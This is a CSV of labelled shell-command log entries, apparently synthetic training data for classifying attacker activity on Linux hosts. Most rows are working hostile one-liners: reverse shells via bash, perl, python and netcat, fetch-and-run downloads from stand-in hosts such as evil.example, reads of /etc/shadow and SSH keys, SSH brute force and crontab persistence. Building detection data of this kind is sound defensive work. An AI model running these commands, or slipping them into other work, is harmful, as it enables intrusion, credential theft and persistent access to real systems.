id,timestamp,log,label
log-17,2025-04-08T13:05:11.538784Z,find / -name '*.conf' -type f,enumeration
log-18,2025-06-16T23:55:43.538794Z,wget http://payloads.net/runme7.sh && chmod +x runme7.sh && ./ runme7.sh,malware_download
log-19,2025-04-24T07:52:13.538804Z,bash -i >& /dev/tcp/192.0.2.12/8080 0>&1,reverse_shell
log-20,2025-12-05T13:41:32.538816Z,wget http://evil.example/install28.sh ; chmod +x install28.sh ; ./ install28.sh,malware_download
log-21,2025-02-13T08:09:59.538826Z,"perl -e 'use Socket;$i=""192.0.2.12"";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-22,2025-11-02T19:20:37.538836Z,curl http://evil.example/payload -o /tmp/p ; bash /tmp/p,malware_download
log-23,2025-08-24T16:28:05.538846Z,hydra -l root -P /tmp/wordlist.txt ssh://203.0.113.7,brute_force
log-24,2025-04-16T05:17:29.538855Z,"perl -e 'use Socket;$i=""172.16.0.9"";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-25,2025-07-14T22:09:49.538864Z,echo 'hello world',unknown
log-26,2025-10-09T00:00:36.538874Z,hydra -l root -P /tmp/wordlist.txt ssh://203.0.113.7,brute_force
log-27,2025-03-31T18:45:51.538883Z,cat /etc/passwd,credential_harvest
log-28,2025-07-25T22:01:27.538892Z,mkdir /tmp/persist82; chmod 777 /tmp/persist82,persistence_or_filesystem
log-29,2025-02-11T07:47:25.538901Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
log-30,2025-10-15T15:01:48.538911Z,curl -fsSL http://evil.example/x88.php -o /tmp/x88.php; php /tmp/x88.php,malware_download
log-31,2025-06-19T12:55:01.538925Z,cat /etc/shadow,credential_harvest
log-32,2025-04-15T15:10:35.538934Z,ss -tulpn; nmap -sT -p- localhost,enumeration
log-33,2025-07-17T15:07:20.538943Z,bash -i >& /dev/tcp/1.2.3.4/80 0>&1,reverse_shell
log-34,2025-10-12T06:11:12.538952Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
log-35,2024-12-09T12:01:51.538961Z,hydra -l root -P /tmp/wordlist.txt ssh://192.0.2.12,brute_force
log-36,2025-07-01T13:02:17.538971Z,curl -fsSL http://badhost.local/runme16.php -o /tmp/runme16.php; php /tmp/runme16.php,malware_download
log-37,2025-02-18T16:56:59.538981Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""45.23.11.9"",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
log-38,2025-08-19T09:17:45.538991Z,sshpass -p 'admin123' ssh ec2-user@10.0.0.5,brute_force
log-39,2025-07-01T19:43:41.539000Z,hydra -l root -P /tmp/wordlist.txt ssh://172.16.0.9,brute_force
log-40,2024-12-15T13:55:37.539009Z,find / -name '*.conf' -type f,enumeration
log-41,2025-03-16T10:59:36.539018Z,sshpass -p 'toor' ssh root@172.16.0.9,brute_force
log-42,2025-04-22T22:06:44.539028Z,curl -fsSL http://evil.example/install79.php -o /tmp/install79.php; php /tmp/install79.php,malware_download
log-43,2025-04-26T01:05:10.539037Z,cat /etc/shadow,credential_harvest
log-44,2025-09-19T20:07:02.539046Z,cat /etc/passwd,credential_harvest
log-45,2025-02-11T03:11:45.539056Z,"python3 -c 'import urllib.request as u;open(""/tmp/x54.py"",""wb"").write(u.urlopen(""http://badhost.local/x54.py"").read())'; python3 /tmp/x54.py",malware_download
log-46,2025-08-16T17:58:11.539065Z,ss -tulpn; nmap -sT -p- localhost,enumeration
log-47,2025-02-06T07:21:30.539075Z,sshpass -p 'password' ssh ec2-user@10.0.0.5,brute_force
log-48,2025-08-20T11:21:07.539083Z,uname -a; id; hostname; ifconfig -a,reconnaissance
log-49,2025-08-14T04:14:10.539093Z,"perl -e 'use Socket;$i=""192.0.2.12"";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-50,2025-08-17T10:58:33.539103Z,wget http://evil.example/x17.sh ; chmod +x x17.sh ; ./ x17.sh,malware_download
log-51,2025-02-15T14:14:33.539112Z,cat /etc/shadow,credential_harvest
log-52,2025-02-02T23:29:59.539122Z,bash -i >& /dev/tcp/203.0.113.7/80 0>&1,reverse_shell
log-53,2025-05-05T10:03:34.539130Z,ss -tulpn; nmap -sT -p- localhost,enumeration
log-54,2025-03-06T10:18:13.539140Z,curl http://payloads.net/payload -o /tmp/p && bash /tmp/p,malware_download
log-55,2025-04-13T07:09:34.539149Z,hydra -l root -P /tmp/wordlist.txt ssh://10.0.0.5,brute_force
log-56,2025-06-15T17:43:30.539158Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
log-57,2025-02-25T19:09:26.539166Z,ss -tulpn; nmap -sT -p- localhost,enumeration
log-58,2025-08-04T16:45:30.539175Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
log-59,2024-12-12T11:23:12.539184Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
log-60,2025-08-18T10:16:41.539195Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""1.2.3.4"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
log-61,2025-03-08T23:17:54.539205Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""45.23.11.9"",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
log-62,2025-04-05T11:52:12.539214Z,nc -e /bin/sh 10.0.0.5 80,reverse_shell
log-63,2025-09-21T07:24:53.539224Z,nc -e /bin/sh 192.0.2.12 4444,reverse_shell
log-64,2025-07-07T06:28:46.539234Z,mkdir /tmp/backdoor57; chmod 777 /tmp/backdoor57,persistence_or_filesystem
log-65,2025-10-26T22:11:20.539243Z,date; whoami,unknown
log-66,2024-12-10T17:36:49.539252Z,nc -e /bin/sh 1.2.3.4 2222,reverse_shell
log-67,2025-09-21T18:14:09.539260Z,cat /etc/shadow,credential_harvest
log-68,2025-07-04T13:15:08.539269Z,find / -name '*.conf' -type f,enumeration
log-69,2025-08-01T02:57:55.539279Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
log-70,2025-02-10T12:02:13.539289Z,wget http://badhost.local/payload84.sh ; chmod +x payload84.sh ; ./ payload84.sh,malware_download
log-71,2025-06-21T12:55:10.539298Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
log-72,2025-05-14T09:10:16.539307Z,cat /etc/shadow,credential_harvest
log-73,2025-04-25T02:01:41.539315Z,find / -name '*.conf' -type f,enumeration
log-74,2025-09-16T16:35:35.539326Z,curl -fsSL http://badhost.local/p81.php -o /tmp/p81.php; php /tmp/p81.php,malware_download
log-75,2025-07-10T09:22:47.539335Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
log-76,2025-07-18T12:47:58.539344Z,cat /etc/shadow,credential_harvest
log-77,2025-06-19T07:48:45.539354Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""10.0.0.5"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
log-78,2025-11-14T16:19:21.539362Z,cat /etc/shadow,credential_harvest
log-79,2025-04-26T00:16:36.539372Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
log-80,2025-01-21T13:26:07.539381Z,for i in {1..1000}; do ssh root@172.16.0.9 -p 8080 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-81,2024-12-21T17:26:38.539391Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
log-82,2025-11-13T16:05:49.539400Z,some-weird-tool --foo bar,unknown
log-83,2025-09-09T01:01:55.539408Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
log-84,2025-07-30T03:33:54.539417Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
log-85,2025-05-03T18:48:05.539427Z,echo '@reboot root /tmp/install45.sh' >> /etc/crontab,persistence_or_filesystem
log-86,2025-07-08T17:09:29.539436Z,for i in {1..1000}; do ssh root@192.0.2.12 -p 443 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-87,2025-01-15T20:59:05.539447Z,"python3 -c 'import urllib.request as u;open(""/tmp/update30.py"",""wb"").write(u.urlopen(""http://badhost.local/update30.py"").read())'; python3 /tmp/update30.py",malware_download
log-88,2025-10-01T00:37:32.539456Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
log-89,2025-07-28T10:21:49.539466Z,echo '@reboot root /tmp/payload65.sh' >> /etc/crontab,persistence_or_filesystem
log-90,2025-06-03T00:37:09.539475Z,echo '@reboot root /tmp/x87.sh' >> /etc/crontab,persistence_or_filesystem
log-91,2025-05-25T04:39:30.539484Z,find / -name '*.conf' -type f,enumeration
log-92,2025-07-05T04:16:08.539493Z,mkdir /tmp/backdoor90; chmod 777 /tmp/backdoor90,persistence_or_filesystem
log-93,2025-04-18T14:23:56.539503Z,sshpass -p 'toor' ssh ec2-user@1.2.3.4,brute_force
log-94,2025-05-12T17:43:19.539512Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
log-95,2025-01-10T14:50:53.539521Z,curl http://malicious.test/payload -o /tmp/p && bash /tmp/p,malware_download
log-96,2025-08-04T23:19:20.539531Z,curl http://malicious.test/payload -o /tmp/p && bash /tmp/p,malware_download
log-97,2025-09-23T23:10:27.539539Z,cat /etc/passwd,credential_harvest
log-98,2025-06-25T03:19:57.539549Z,sshpass -p 'password' ssh root@172.16.0.9,brute_force
log-99,2025-04-19T09:33:46.539558Z,wget http://malicious.test/install58.sh && chmod +x install58.sh && ./ install58.sh,malware_download
log-100,2025-10-12T10:03:25.539567Z,nc -e /bin/sh 10.0.0.5 2222,reverse_shell
log-101,2025-02-04T08:35:24.539576Z,cat /etc/shadow,credential_harvest
log-102,2025-04-18T13:23:23.539587Z,"perl -e 'use Socket;$i=""172.16.0.9"";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-103,2025-10-22T00:47:57.539596Z,sshpass -p 'admin123' ssh ubuntu@192.0.2.12,brute_force
log-104,2025-05-05T02:02:02.539606Z,wget http://badhost.local/runme16.sh && chmod +x runme16.sh && ./ runme16.sh,malware_download
log-105,2025-06-10T07:39:15.539615Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
log-106,2025-09-05T17:57:27.539625Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""45.23.11.9"",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
log-107,2025-09-25T04:51:14.539633Z,cat /etc/shadow,credential_harvest
log-108,2025-06-23T07:14:30.539642Z,echo 'hello world',unknown
log-109,2025-01-30T11:48:46.539651Z,uname -a; id; hostname; ifconfig -a,reconnaissance
log-110,2024-12-30T16:40:40.539660Z,sshpass -p 'toor' ssh ec2-user@1.2.3.4,brute_force
log-111,2025-07-29T17:22:07.539670Z,"python3 -c 'import urllib.request as u;open(""/tmp/x99.py"",""wb"").write(u.urlopen(""http://malware.srv/x99.py"").read())'; python3 /tmp/x99.py",malware_download
log-112,2025-02-23T15:00:44.539679Z,nc -e /bin/sh 172.16.0.9 2222,reverse_shell
log-113,2025-07-11T23:42:49.539689Z,wget http://payloads.net/payload55.sh && chmod +x payload55.sh && ./ payload55.sh,malware_download
log-114,2025-02-08T13:19:38.539699Z,for i in {1..1000}; do ssh root@203.0.113.7 -p 2222 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-115,2025-03-20T20:50:50.539709Z,for i in {1..1000}; do ssh root@172.16.0.9 -p 9001 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-116,2025-09-09T05:58:28.539718Z,echo '@reboot root /tmp/p19.sh' >> /etc/crontab,persistence_or_filesystem
log-117,2025-04-26T01:25:15.539728Z,wget http://malicious.test/runme73.sh && chmod +x runme73.sh && ./ runme73.sh,malware_download
log-118,2025-04-20T02:32:16.539737Z,hydra -l root -P /tmp/wordlist.txt ssh://10.0.0.5,brute_force
log-119,2025-02-17T04:10:28.539747Z,curl http://evil.example/payload -o /tmp/p && bash /tmp/p,malware_download
log-120,2025-01-10T21:37:28.539757Z,"python3 -c 'import urllib.request as u;open(""/tmp/update92.py"",""wb"").write(u.urlopen(""http://malware.srv/update92.py"").read())'; python3 /tmp/update92.py",malware_download
log-121,2025-06-16T06:08:19.539767Z,"python3 -c 'import urllib.request as u;open(""/tmp/update37.py"",""wb"").write(u.urlopen(""http://payloads.net/update37.py"").read())'; python3 /tmp/update37.py",malware_download
log-122,2025-01-01T22:45:28.539777Z,curl http://evil.example/payload -o /tmp/p ; bash /tmp/p,malware_download
log-123,2024-12-28T08:44:30.539786Z,echo '@reboot root /tmp/payload49.sh' >> /etc/crontab,persistence_or_filesystem
log-124,2025-04-02T20:54:59.539796Z,"python3 -c 'import urllib.request as u;open(""/tmp/x28.py"",""wb"").write(u.urlopen(""http://malware.srv/x28.py"").read())'; python3 /tmp/x28.py",malware_download
log-125,2025-05-28T22:17:27.539805Z,bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,reverse_shell
log-126,2025-04-21T19:23:14.539815Z,curl -fsSL http://payloads.net/install79.php -o /tmp/install79.php; php /tmp/install79.php,malware_download
log-127,2025-08-26T05:53:31.539825Z,for i in {1..1000}; do ssh root@45.23.11.9 -p 9001 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-128,2025-09-15T17:58:30.539834Z,curl http://evil.example/payload -o /tmp/p ; bash /tmp/p,malware_download
log-129,2025-05-18T09:37:46.539843Z,hydra -l root -P /tmp/wordlist.txt ssh://192.0.2.12,brute_force
log-130,2025-09-28T02:30:45.539853Z,"perl -e 'use Socket;$i=""10.0.0.5"";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-131,2025-09-21T07:55:33.539863Z,"perl -e 'use Socket;$i=""172.16.0.9"";$p=2222;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-132,2025-05-06T04:38:37.539871Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
log-133,2025-09-24T17:18:08.539880Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
log-134,2025-06-06T01:26:35.539889Z,hydra -l root -P /tmp/wordlist.txt ssh://45.23.11.9,brute_force
log-135,2025-07-31T03:18:57.539898Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
log-136,2025-06-16T04:30:13.539907Z,nc -e /bin/sh 45.23.11.9 80,reverse_shell
log-137,2025-08-26T02:18:44.539916Z,"python3 -c 'import urllib.request as u;open(""/tmp/runme59.py"",""wb"").write(u.urlopen(""http://payloads.net/runme59.py"").read())'; python3 /tmp/runme59.py",malware_download
log-138,2025-06-08T02:10:00.539925Z,find / -name '*.conf' -type f,enumeration
log-139,2025-06-16T21:06:19.539935Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
log-140,2025-07-09T16:12:44.539944Z,for i in {1..1000}; do ssh root@203.0.113.7 -p 9001 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-141,2025-06-09T05:31:16.539954Z,curl http://badhost.local/payload -o /tmp/p ; bash /tmp/p,malware_download
log-142,2025-09-24T05:47:10.539963Z,date; whoami,unknown
log-143,2025-09-19T11:31:33.539972Z,cat /etc/shadow,credential_harvest
log-144,2025-10-10T02:57:49.539981Z,echo '@reboot root /tmp/install41.sh' >> /etc/crontab,persistence_or_filesystem
log-145,2025-01-27T17:30:34.539989Z,cat /etc/shadow,credential_harvest
log-146,2024-12-22T16:16:16.539998Z,cat /etc/shadow,credential_harvest
log-147,2025-03-21T19:44:34.540007Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
log-148,2025-02-27T23:10:56.540017Z,curl -fsSL http://malicious.test/update71.php -o /tmp/update71.php; php /tmp/update71.php,malware_download
log-149,2025-06-27T04:31:13.540026Z,uname -a; id; hostname; ifconfig -a,reconnaissance
log-150,2025-03-16T22:20:09.540037Z,"python3 -c 'import urllib.request as u;open(""/tmp/install65.py"",""wb"").write(u.urlopen(""http://malware.srv/install65.py"").read())'; python3 /tmp/install65.py",malware_download
log-151,2025-02-27T17:54:53.540046Z,bash -i >& /dev/tcp/172.16.0.9/8080 0>&1,reverse_shell
log-152,2025-11-23T00:56:59.540056Z,curl http://malware.srv/payload -o /tmp/p ; bash /tmp/p,malware_download
log-153,2025-04-03T18:59:29.540065Z,curl http://malicious.test/payload -o /tmp/p && bash /tmp/p,malware_download
log-154,2025-04-13T20:28:44.540073Z,ss -tulpn; nmap -sT -p- localhost,enumeration
log-155,2025-02-23T00:02:28.540083Z,bash -i >& /dev/tcp/172.16.0.9/9001 0>&1,reverse_shell
log-156,2025-01-25T12:41:00.540092Z,"perl -e 'use Socket;$i=""10.0.0.5"";$p=2222;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-157,2025-07-02T09:47:54.540101Z,bash -i >& /dev/tcp/203.0.113.7/80 0>&1,reverse_shell
log-158,2025-02-04T04:05:10.540111Z,"python3 -c 'import urllib.request as u;open(""/tmp/p7.py"",""wb"").write(u.urlopen(""http://malware.srv/p7.py"").read())'; python3 /tmp/p7.py",malware_download
log-159,2025-05-14T14:35:01.540120Z,cat /etc/shadow,credential_harvest
log-160,2025-01-21T05:39:35.540130Z,wget http://malware.srv/p50.sh && chmod +x p50.sh && ./ p50.sh,malware_download
log-161,2025-11-17T22:55:04.540140Z,wget http://payloads.net/x26.sh ; chmod +x x26.sh ; ./ x26.sh,malware_download
log-162,2025-01-25T17:00:44.540149Z,cat /etc/shadow,credential_harvest
log-163,2025-10-11T12:44:29.540157Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
log-164,2025-03-13T05:00:18.540166Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
log-165,2025-05-06T22:23:37.540175Z,cat /etc/shadow,credential_harvest
log-166,2025-06-23T10:29:24.540185Z,sshpass -p 'toor' ssh ec2-user@203.0.113.7,brute_force
log-167,2025-04-03T20:54:25.540195Z,for i in {1..1000}; do ssh root@192.0.2.12 -p 6666 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-168,2025-04-05T15:12:27.540204Z,echo '@reboot root /tmp/runme27.sh' >> /etc/crontab,persistence_or_filesystem
log-169,2025-11-15T17:26:05.540212Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
log-170,2024-12-15T18:01:04.540221Z,mkdir /tmp/xdata72; chmod 777 /tmp/xdata72,persistence_or_filesystem
log-171,2025-04-10T00:14:47.540232Z,curl -fsSL http://malicious.test/p13.php -o /tmp/p13.php; php /tmp/p13.php,malware_download
log-172,2025-07-12T16:12:49.540240Z,cat /etc/passwd,credential_harvest
log-173,2025-05-17T09:52:15.540249Z,nc -e /bin/sh 172.16.0.9 6666,reverse_shell
log-174,2025-04-11T17:58:24.540259Z,curl http://evil.example/payload -o /tmp/p && bash /tmp/p,malware_download
log-175,2025-07-08T07:14:05.540270Z,wget http://badhost.local/runme24.sh && chmod +x runme24.sh && ./ runme24.sh,malware_download
log-176,2024-12-30T00:26:03.540279Z,cat /etc/passwd,credential_harvest
log-177,2025-07-23T15:54:21.540288Z,curl -fsSL http://payloads.net/install31.php -o /tmp/install31.php; php /tmp/install31.php,malware_download
log-178,2025-09-16T13:08:47.540298Z,nc -e /bin/sh 172.16.0.9 9001,reverse_shell
log-179,2025-04-06T22:19:47.540307Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
log-180,2025-04-22T08:40:37.540316Z,hydra -l root -P /tmp/wordlist.txt ssh://192.0.2.12,brute_force
log-181,2024-12-23T20:25:43.540324Z,cat /etc/passwd,credential_harvest
log-182,2025-02-22T01:48:18.540333Z,cat /etc/shadow,credential_harvest
log-183,2025-10-31T02:15:29.540341Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
log-184,2025-09-28T04:33:00.540350Z,hydra -l root -P /tmp/wordlist.txt ssh://203.0.113.7,brute_force
log-185,2025-06-11T23:35:16.540359Z,some-weird-tool --foo bar,unknown
log-186,2025-03-03T12:27:54.540369Z,"python3 -c 'import urllib.request as u;open(""/tmp/p39.py"",""wb"").write(u.urlopen(""http://malware.srv/p39.py"").read())'; python3 /tmp/p39.py",malware_download
log-187,2025-01-02T12:38:35.540378Z,sshpass -p 'admin123' ssh admin@192.0.2.12,brute_force
log-188,2025-11-14T13:15:40.540387Z,uname -a; id; hostname; ifconfig -a,reconnaissance
log-189,2025-02-03T16:13:55.540396Z,hydra -l root -P /tmp/wordlist.txt ssh://1.2.3.4,brute_force
log-190,2024-12-24T12:21:11.540405Z,bash -i >& /dev/tcp/45.23.11.9/2222 0>&1,reverse_shell
log-191,2025-07-06T14:12:02.540414Z,uname -a; id; hostname; ifconfig -a,reconnaissance
log-192,2025-02-24T08:36:38.540424Z,"python3 -c 'import urllib.request as u;open(""/tmp/p72.py"",""wb"").write(u.urlopen(""http://malicious.test/p72.py"").read())'; python3 /tmp/p72.py",malware_download
log-193,2025-07-22T14:10:29.540433Z,curl -fsSL http://badhost.local/update12.php -o /tmp/update12.php; php /tmp/update12.php,malware_download
log-194,2025-08-20T20:59:19.540442Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
log-195,2025-05-26T10:55:53.540452Z,mkdir /tmp/xdata37; chmod 777 /tmp/xdata37,persistence_or_filesystem
log-196,2025-06-26T20:30:41.540461Z,for i in {1..1000}; do ssh root@10.0.0.5 -p 9001 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-197,2025-09-19T20:45:50.540470Z,"perl -e 'use Socket;$i=""203.0.113.7"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-198,2025-09-11T15:05:05.540480Z,"perl -e 'use Socket;$i=""45.23.11.9"";$p=2222;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-199,2025-12-03T12:53:32.540490Z,"python3 -c 'import urllib.request as u;open(""/tmp/p86.py"",""wb"").write(u.urlopen(""http://malicious.test/p86.py"").read())'; python3 /tmp/p86.py",malware_download
log-200,2025-01-24T04:41:17.540500Z,curl -fsSL http://evil.example/payload59.php -o /tmp/payload59.php; php /tmp/payload59.php,malware_download
log-201,2025-11-28T08:37:54.540509Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
log-202,2025-08-30T05:20:30.540518Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
log-203,2025-08-13T16:59:07.540527Z,for i in {1..1000}; do ssh root@192.0.2.12 -p 4444 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-204,2025-12-02T21:40:02.540536Z,cat /etc/passwd,credential_harvest
log-205,2025-11-14T01:12:01.540546Z,"python3 -c 'import urllib.request as u;open(""/tmp/x28.py"",""wb"").write(u.urlopen(""http://badhost.local/x28.py"").read())'; python3 /tmp/x28.py",malware_download
log-206,2025-09-24T13:24:20.540555Z,cat /etc/shadow,credential_harvest
log-207,2025-10-27T09:40:26.540566Z,echo '@reboot root /tmp/install97.sh' >> /etc/crontab,persistence_or_filesystem
log-208,2025-11-21T04:49:10.540575Z,cat /etc/shadow,credential_harvest
